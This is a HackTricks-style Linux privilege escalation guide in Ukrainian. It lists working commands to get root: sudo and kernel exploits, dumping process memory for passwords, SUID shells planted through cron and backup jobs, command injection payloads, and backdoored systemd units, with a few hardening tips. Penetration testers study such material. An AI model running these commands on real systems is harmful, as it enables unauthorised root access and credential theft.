# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Інформація про систему

### Інформація про ОС

Почнемо збирати інформацію про запущену ОС
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Шлях

Якщо ви **маєте права запису в будь-яку папку всередині змінної `PATH`**, ви можете підмінити деякі бібліотеки або бінарні файли:
```bash
echo $PATH
```
### Інформація про змінні середовища

Чи містять змінні середовища цікаву інформацію, паролі або API-ключі?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Перевірте версію kernel та наявність exploit, який можна використати для escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Ви можете знайти хороший список уразливих ядер і деякі вже **compiled exploits** тут: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) та [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Інші сайти, де можна знайти деякі **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Щоб витягти всі версії уразливих ядер з цього сайту, ви можете зробити так:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Інструменти, які можуть допомогти у пошуку kernel exploits:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim, only checks exploits for kernel 2.x)

Завжди **шукайте kernel version в Google**, можливо ваша версія ядра вже згадується в якомусь kernel exploit, і тоді ви будете впевнені, що цей exploit дійсний.

Додаткові kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

На основі уразливих версій sudo, які з'являються в:
```bash
searchsploit sudo
```
Ви можете перевірити, чи уразлива версія sudo за допомогою цього grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Версії Sudo до 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) дозволяють звичайним локальним користувачам підвищити свої привілеї до root через опцію sudo `--chroot`, коли файл `/etc/nsswitch.conf` використовується з директорії, контрольованої користувачем.

Ось [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) для exploit цієї [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Перед запуском експлоїту переконайтесь, що ваша версія `sudo` вразлива та що вона підтримує функцію `chroot`.

Для додаткової інформації зверніться до оригінального [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Від @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg перевірка підпису не пройшла

Перегляньте **smasher2 box of HTB** для **прикладу** того, як цю vuln можна експлуатувати
```bash
dmesg 2>/dev/null | grep "signature"
```
### Більше system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Перелічте можливі заходи захисту

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Якщо ви перебуваєте всередині container, почніть із наступної секції container-security, а потім pivot до сторінок, специфічних для runtime, що описують abuse:


{{#ref}}
container-security/
{{#endref}}

## Диски

Перевірте **що змонтовано і що не змонтовано**, де саме і чому. Якщо щось не змонтовано, ви можете спробувати змонтувати це і перевірити на наявність приватної інформації
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Корисне програмне забезпечення

Перелічте корисні бінарні файли
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Також перевірте, чи встановлено **any compiler is installed**. Це корисно, якщо вам потрібно використати якийсь kernel exploit, оскільки рекомендується компілювати його на машині, де ви збираєтеся його використовувати (або на подібній).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Вразливе встановлене програмне забезпечення

Перевірте **версії встановлених пакетів і сервісів**. Можливо, існує стара версія Nagios (наприклад), яку можна використати для ескалації привілеїв…\
Рекомендується вручну перевіряти версії найбільш підозрілого встановленого програмного забезпечення.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Якщо у вас є SSH доступ до машини, ви також можете використати **openVAS** для перевірки застарілого та вразливого програмного забезпечення, встановленого на ній.

> [!NOTE] > _Зауважте, що ці команди покажуть багато інформації, яка здебільшого буде марною, тому рекомендується використовувати такі програми, як OpenVAS або подібні, які перевірять, чи якась встановлена версія ПЗ є вразливою до відомих exploits_

## Процеси

Перегляньте, **які процеси** виконуються і перевірте, чи якийсь процес не має **більше привілеїв, ніж слід** (можливо tomcat запускається від root?)
```bash
ps aux
ps -ef
top -n 1
```
Завжди перевіряйте на наявність можливих [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** виявляє їх, перевіряючи параметр `--inspect` у командному рядку процесу.\  
Також **check your privileges over the processes binaries**, можливо ви зможете перезаписати чиїсь бінарні файли.

### Ланцюги батько-дитина між різними користувачами

Дочірній процес, що виконується під **іншим користувачем**, ніж його батько, не обов'язково є шкідливим, але це корисний сигнал для попередньої оцінки. Деякі переходи очікувані (`root` породжує сервісного користувача, менеджери входу створюють процеси сесії), але незвичні ланцюги можуть виявити wrappers, debug helpers, persistence або слабкі межі довіри під час виконання.

Quick review:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Якщо ви знайдете несподіваний ланцюжок, проаналізуйте батьківський командний рядок та всі файли, що впливають на його поведінку (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments). У кількох реальних privesc шляхах сам дочірній процес не був доступний для запису, але **parent-controlled config** або допоміжний ланцюжок були доступні для запису.

### Видалені виконувані файли та файли, відкриті після видалення

Артефакти під час виконання часто залишаються доступними **після видалення**. Це корисно як для privilege escalation, так і для відновлення доказів із процесу, який уже має відкриті чутливі файли.

Перевірте наявність видалених виконуваних файлів:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Якщо `/proc/<PID>/exe` вказує на `(deleted)`, процес все ще виконує старий бінарний образ з пам'яті. Це сильний сигнал до розслідування, оскільки:

- видалений виконуваний файл може містити цікаві strings або credentials
- запущений процес може досі надавати доступ до корисних file descriptors
- deleted privileged binary може вказувати на недавні маніпуляції або спроби очистити сліди

Collect deleted-open files globally:
```bash
lsof +L1
```
Якщо ви знайдете цікавий дескриптор, відновіть його безпосередньо:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Це особливо корисно, коли процес все ще має відкритий видалений секрет, скрипт, експорт бази даних або файл прапора.

### Process monitoring

Ви можете використовувати інструменти на зразок [**pspy**](https://github.com/DominicBreuker/pspy) для моніторингу процесів. Це може бути дуже корисно для виявлення вразливих процесів, які виконуються часто або коли виконуються певні умови.

### Process memory

Деякі сервіси на сервері зберігають **облікові дані в незашифрованому вигляді в пам'яті**.\
Зазвичай вам будуть потрібні **root privileges** щоб читати пам'ять процесів, що належать іншим користувачам, тому це зазвичай корисніше, коли ви вже root і хочете знайти більше облікових даних.\
Однак пам'ятайте, що **як звичайний користувач ви можете читати пам'ять процесів, які вам належать**.

> [!WARNING]
> Зауважте, що сьогодні більшість машин **за замовчуванням не дозволяють ptrace**, а це означає, що ви не можете дампити інші процеси, які належать вашому непривілейованому користувачу.
>
> Файл _**/proc/sys/kernel/yama/ptrace_scope**_ контролює доступність ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: всі процеси можуть відлагоджуватися, якщо вони мають той самий uid. Це класичний спосіб роботи ptrace.
> - **kernel.yama.ptrace_scope = 1**: відлагоджуватись може лише батьківський процес.
> - **kernel.yama.ptrace_scope = 2**: Только admin може використовувати ptrace, оскільки це вимагає capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: Жодні процеси не можуть бути відстежені за допомогою ptrace. Після встановлення потрібен reboot, щоб знову дозволити ptracing.

#### GDB

Якщо у вас є доступ до пам'яті сервісу FTP (наприклад), ви можете отримати Heap і шукати в ньому облікові дані.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Для заданого ідентифікатора процесу (PID), **maps показують, як пам'ять відображається в межах цього процесу** в його віртуальному адресному просторі; вони також показують **права доступу кожного відображеного регіону**. Псевдофайл **mem** **дає доступ до самої пам'яті процесу**. З файлу **maps** ми знаємо, які **регіони пам'яті доступні для читання** та їхні зсуви. Ми використовуємо цю інформацію, щоб **звернутися до файлу mem та зберегти у файл усі регіони, доступні для читання**.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` дає доступ до **фізичної** пам'яті системи, а не до віртуальної пам'яті. До віртуального адресного простору ядра можна отримати доступ за допомогою `/dev/kmem`.\
Зазвичай, `/dev/mem` доступний для читання лише користувачеві **root** та групі **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump для linux

ProcDump — це переосмислена для Linux версія класичного інструмента ProcDump із набору інструментів Sysinternals для Windows. Завантажити можна за адресою [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Інструменти

To dump a process memory you could use:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Ви можете вручну видалити вимоги root та дампнути процес, який належить вам
- Скрипт A.5 з [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (потрібні права root)

### Облікові дані з пам'яті процесу

#### Ручний приклад

Якщо ви виявите, що процес authenticator запущений:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Ви можете dump the process (див. попередні розділи, щоб знайти різні способи dump the memory of a process) і шукати credentials всередині memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

The tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) буде **викрадати облікові дані у відкритому вигляді з пам'яті** та з деяких **відомих файлів**. Він потребує привілеїв root для коректної роботи.

| Функція                                           | Назва процесу         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Регулярні вирази пошуку/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Заплановані/Cron jobs

### Crontab UI (alseambusher) running as root – веб-інтерфейсний планувальник privesc

Якщо веб‑панель “Crontab UI” (alseambusher/crontab-ui) запущена як root і прив’язана лише до loopback, ви все одно можете дістатися до неї через SSH local port-forwarding і створити привілейоване завдання для ескалації.

Типова послідовність
- Знайти порт, доступний лише на loopback (наприклад, 127.0.0.1:8000) та Basic-Auth realm за допомогою `ss -ntlp` / `curl -v localhost:8000`
- Знайти облікові дані в операційних артефактах:
  - Бекапи/скрипти з `zip -P <password>`
  - systemd unit із `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Відкрити тунель і увійти:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Створити high-priv job і запустити негайно (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Використовуйте це:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Не запускайте Crontab UI як root; обмежте його спеціальним користувачем із мінімальними правами
- Прив'язуйте до localhost і додатково обмежуйте доступ через firewall/VPN; не використовуйте повторно паролі
- Уникайте вбудовування секретів у unit files; використовуйте secret stores або root-only EnvironmentFile
- Увімкніть audit/logging для on-demand job executions

Перевірте, чи якась запланована задача вразлива. Можливо, ви зможете скористатися скриптом, що виконується від імені root (wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Якщо використовується `run-parts`, перевірте, які імена справді будуть виконані:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Це запобігає хибним спрацьовуванням. Каталог periodic, доступний для запису, корисний лише якщо ім'я вашого payload-файлу відповідає локальним правилам `run-parts`.

### Шлях cron

Наприклад, всередині _/etc/crontab_ ви можете знайти PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Зверніть увагу, що користувач "user" має права запису у /home/user_)

Якщо в цьому crontab root намагається виконати якусь команду або скрипт, не вказавши PATH. Наприклад: _\* \* \* \* root overwrite.sh_\
Тоді ви можете отримати root shell, використавши:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Якщо скрипт виконується від імені root і містить “**\***” всередині команди, ви можете експлуатувати це, щоб отримати небажані наслідки (наприклад privesc). Приклад:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Якщо wildcard передує шляху, наприклад** _**/some/path/\***_ **, це не вразливо (навіть** _**./\***_ **не вразливо).**

Читайте наступну сторінку для додаткових трюків з експлуатації wildcard:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash виконує parameter expansion і command substitution перед арифметичною оцінкою в ((...)), $((...)) та let. Якщо root cron/parser читає ненадійні поля журналу і підставляє їх в арифметичний контекст, атакуючий може інжектувати command substitution $(...), яка виконається як root при запуску cron.

- Why it works: У Bash розширення відбуваються в такому порядку: розширення параметрів/змінних, підстановка команд, арифметичне розширення, потім розбиття на слова та розширення шляхів. Тому значення на кшталт `$(/bin/bash -c 'id > /tmp/pwn')0` спочатку підставляється (виконується команда), після чого залишкова числова `0` використовується для арифметики, тож скрипт продовжує роботу без помилок.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Домогтися запису в parsed log тексту, керованого атакуючим, так щоб поле, що виглядає як число, містило command substitution і закінчувалося цифрою. Переконайтеся, що ваша команда не пише в stdout (або перенаправте вивід), щоб арифметика залишалася валідною.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Якщо скрипт, який виконується від імені root, використовує **каталог, до якого ви маєте повний доступ**, можливо, буде корисно видалити цю папку та **створити symlink на інший каталог**, який обслуговує скрипт під вашим контролем
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Перевірка symlink та безпечніша обробка файлів

Під час перегляду privileged scripts/binaries, які читають або записують файли за шляхом, перевіряйте, як обробляються symlink-и:

- `stat()` слідує за symlink і повертає метадані цільового файлу.
- `lstat()` повертає метадані самого symlink.
- `readlink -f` and `namei -l` допомагають визначити кінцеву ціль і показати права доступу кожного компонента шляху.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Для захисників/розробників, безпечніші підходи проти symlink tricks включають:

- `O_EXCL` with `O_CREAT`: провалюватися, якщо шлях вже існує (блокує заздалегідь створені зловмисником посилання/файли).
- `openat()`: працювати відносно надійного дескриптора директорії.
- `mkstemp()`: атомарно створювати тимчасові файли з безпечними правами.

### Користувацьки підписані cron бінарні файли з writable payloads
Blue teams іноді "підписують" cron-запущені бінарні файли, вивантажуючи кастомний ELF-секшн і grep'ять рядок постачальника перед виконанням їх від root. Якщо цей бінарник має груповий запис (наприклад, `/opt/AV/periodic-checks/monitor` належить `root:devs 770`) і ви можете leak the signing material, ви можете підробити секцію і захопити cron-завдання:

1. Використайте `pspy` для фіксації потоку верифікації. В Era root виконував `objcopy --dump-section .text_sig=text_sig_section.bin monitor`, потім `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` і після цього запускав файл.
2. Відтворіть очікуваний сертифікат використовуючи leaked key/config (з `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Створіть шкідливу заміну (наприклад, встановіть SUID bash, додайте ваш SSH ключ) і вбудуйте сертифікат у `.text_sig`, щоб grep пройшов:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Перезапишіть запланований бінарник, зберігаючи біти виконання:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Зачекайте наступного запуску cron; як тільки наївна перевірка підпису пройде, ваш payload запуститься від імені root.

### Часті cron завдання

Ви можете моніторити процеси, щоб знайти ті, що виконуються кожні 1, 2 або 5 хвилин. Можливо, це можна використати для підвищення привілеїв.

Наприклад, щоб **моніторити кожні 0.1s протягом 1 хвилини**, **сортувати за найменш виконуваними командами** і видаляти команди, які виконувалися найчастіше, можна зробити:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ви також можете використати** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (це буде моніторити та перераховувати кожен процес, що запускається).

### Резервні копії root, що зберігають біти режиму, встановлені атакуючим (pg_basebackup)

Якщо cron, що належить root, обгортає `pg_basebackup` (або будь-яку рекурсивну копію) для каталогу бази даних, у який ви можете записувати, ви можете встановити **SUID/SGID binary**, який буде скопійований як **root:root** з тими ж біта(ми) режиму у вихід резервної копії.

Типовий сценарій виявлення (як користувач DB з низькими привілеями):
- Використайте `pspy`, щоб виявити cron від root, який викликає щось на кшталт `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` кожну хвилину.
- Підтвердіть, що вихідний кластер (наприклад, `/var/lib/postgresql/14/main`) доступний для запису для вас і що директорія призначення (`/opt/backups/current`) після виконання завдання набуває власника root.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Це працює, тому що `pg_basebackup` зберігає біти режиму файлу при копіюванні кластера; при виклику від імені root файли у місці призначення успадковують **root ownership + attacker-chosen SUID/SGID**. Будь-яка подібна привілейована процедура резервного копіювання/копіювання, яка зберігає права доступу і записує в виконувальне розташування, уразлива.

### Невидимі cron jobs

Можна створити cronjob **putting a carriage return after a comment** (without newline character), і cron job спрацює. Приклад (зверніть увагу на carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Щоб виявити такий прихований доступ, перевірте cron-файли інструментами, що відображають керуючі символи:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Служби

### Файли _.service_, доступні для запису

Перевірте, чи можете ви записати будь-який файл `.service`, якщо можете, ви **можете модифікувати його** так, щоб він **виконував** ваш **backdoor коли** служба **запускається**, **перезапускається** або **зупиняється** (можливо, доведеться дочекатися, поки машина не буде перезавантажена).\
Наприклад, створіть ваш backdoor всередині файлу .service з **`ExecStart=/tmp/script.sh`**

### Бінарні файли сервісів, доступні для запису

Майте на увазі, що якщо у вас є **права запису над бінарними файлами, які виконуються службами**, ви можете змінити їх на backdoors, тож коли служби будуть повторно виконані, backdoors будуть виконані.

### systemd PATH - Відносні шляхи

Ви можете побачити PATH, який використовує **systemd**, за допомогою:
```bash
systemctl show-environment
```
Якщо ви виявите, що можете **write** у будь-якій із папок шляху, можливо, ви зможете **escalate privileges**. Потрібно шукати **relative paths being used on service configurations** files, наприклад:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Потім створіть **executable** з **same name as the relative path binary** всередині теки systemd PATH, куди ви маєте права запису, і коли службі буде наказано виконати вразливу дію (**Start**, **Stop**, **Reload**), ваш **backdoor will be executed** (звичайно неповноважені користувачі не можуть запускати/зупиняти служби, але перевірте, чи можете використати `sudo -l`).

**Дізнайтеся більше про служби за допомогою `man systemd.service`.**

## **Timers**

**Timers** — це systemd unit files, назви яких закінчуються на `**.timer**`, що контролюють `**.service**` файли або події. **Timers** можна використовувати як альтернативу cron, оскільки вони мають вбудовану підтримку подій календарного часу та монотонних часових подій і можуть виконуватися асинхронно.

Ви можете перелічити всі таймери за допомогою:
```bash
systemctl list-timers --all
```
### Записувані таймери

Якщо ви можете змінити таймер, ви можете змусити його виконати деякі існуючі одиниці systemd.unit (наприклад, `.service` або `.target`)
```bash
Unit=backdoor.service
```
У документації можна прочитати, що таке Unit:

> Юніт, який активується, коли цей timer спрацьовує. Аргумент — це ім'я юніта, суфікс якого не є ".timer". Якщо не вказано, це значення за замовчуванням вказує на service з тим самим ім'ям, що й timer unit, за винятком суфіксу. (Див. вище.) Рекомендується, щоб ім'я юніта, який активується, та ім'я timer unit були ідентичні, за винятком суфіксу.

Отже, щоб зловживати цим дозволом, вам потрібно:

- Знайти якийсь systemd unit (наприклад, `.service`), який **виконує бінарний файл, доступний для запису**
- Знайти якийсь systemd unit, який **виконує відносний шлях** і над яким ви маєте **права на запис** у **systemd PATH** (щоб підмінити цей виконуваний файл)

**Дізнайтеся більше про timers за допомогою `man systemd.timer`.**

### **Увімкнення таймера**

Щоб увімкнути timer, потрібні права root і виконати:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Зверніть увагу, що **timer** **активується** створенням символьного посилання на нього в `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Сокети

Unix Domain Sockets (UDS) дозволяють **зв'язок між процесами** на тих самих або різних машинах у моделях client-server. Вони використовують стандартні Unix descriptor файли для міжкомп'ютерного обміну і налаштовуються через `.socket` файли.

Sockets можна налаштовувати за допомогою `.socket` файлів.

**Дізнайтесь більше про sockets за допомогою `man systemd.socket`.** У цьому файлі можна налаштувати кілька цікавих параметрів:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ці опції відрізняються, але загалом використовуються, щоб **вказати, де буде прослуховуватись** сокет (шлях до AF_UNIX socket файлу, IPv4/6 та/або номер порту для прослуховування тощо).
- `Accept`: Приймає булевий аргумент. Якщо **true**, для кожного вхідного з'єднання створюється екземпляр service і лише сокет цього з'єднання передається йому. Якщо **false**, усі прослуховуючі сокети передаються **запущеному service unit**, і створюється лише один service unit для всіх з'єднань. Це значення ігнорується для datagram sockets і FIFOs, де один service unit безумовно обробляє весь вхідний трафік. **За замовчуванням — false**. З міркувань продуктивності рекомендується писати нові демони так, щоб вони підходили для `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Приймають одну або кілька командних рядків, які **виконуються перед** або **після** того, як прослуховуючі **sockets**/FIFOs **створюються** та прив'язуються, відповідно. Перший токен командного рядка має бути абсолютним шляхом до файлу, далі — аргументи процесу.
- `ExecStopPre`, `ExecStopPost`: Додаткові **команди**, які **виконуються перед** або **після** того, як прослуховуючі **sockets**/FIFOs **закриваються** та видаляються, відповідно.
- `Service`: Вказує ім'я **service** unit, яке слід **активувати** при **вхідному трафіку**. Ця настройка дозволена тільки для сокетів з Accept=no. За замовчуванням використовується service з тією ж назвою, що й socket (із заміною суфікса). У більшості випадків використання цієї опції не повинно бути необхідним.

### .socket файли, доступні для запису

